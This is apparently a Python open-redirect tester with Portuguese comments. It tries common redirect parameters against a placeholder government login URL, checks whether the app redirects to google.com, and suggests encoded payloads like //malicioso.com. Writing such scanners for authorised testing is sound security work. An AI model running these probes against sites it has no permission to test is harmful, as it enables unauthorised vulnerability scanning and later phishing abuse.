import requests
from urllib.parse import urlencode

# URL base a ser testada (sem parâmetros)
base_url = "https://siteexemplo.gov.br/login"

# Lista de possíveis nomes de parâmetros de redirecionamento
redirect_params = ["redirect", "url", "next", "return", "continue", "dest", "destination"]

# URL para onde tentar redirecionar (pode ser seu domínio ou https://google.com)
test_redirect_url = "https://google.com"

# Proxy opcional (exemplo com Burp Suite rodando localmente)
use_proxy = False
proxies = {
    "http": "http://127.0.0.1:8080",
    "https": "http://127.0.0.1:8080",
}

print("Iniciando teste de open redirect...\n")

# Loop pelos possíveis parâmetros
for param in redirect_params:
    params = {param: test_redirect_url}
    test_url = f"{base_url}?{urlencode(params)}"

    try:
        # Enviar requisição
        response = requests.get(test_url, allow_redirects=True, proxies=proxies if use_proxy else None, timeout=10)

        # Analisar se houve redirecionamento externo
        if response.url.startswith(test_redirect_url):
            print(f"[VULNERÁVEL] Parâmetro '{param}' permite redirecionamento externo!")
        else:
            print(f"[SEGURO] Parâmetro '{param}' não redireciona externamente.")
        print("  → URL final:", response.url, "\n")

    except requests.exceptions.RequestException as e:
        print(f"[ERRO] Testando com parâmetro '{param}':", e, "\n")


'''

#Como usar
Substitua base_url pela URL da aplicação que você quer testar.
Marque use_proxy = True se quiser usar proxy (Burp/ZAP).

Execute com:
#python open_redirect_tester.py

Possíveis melhorias
Testar também payloads encoding (%2f%2fmalicioso.com, //malicioso.com etc.)

Salvar resultados em arquivo
Testar POST, se aplicável
'''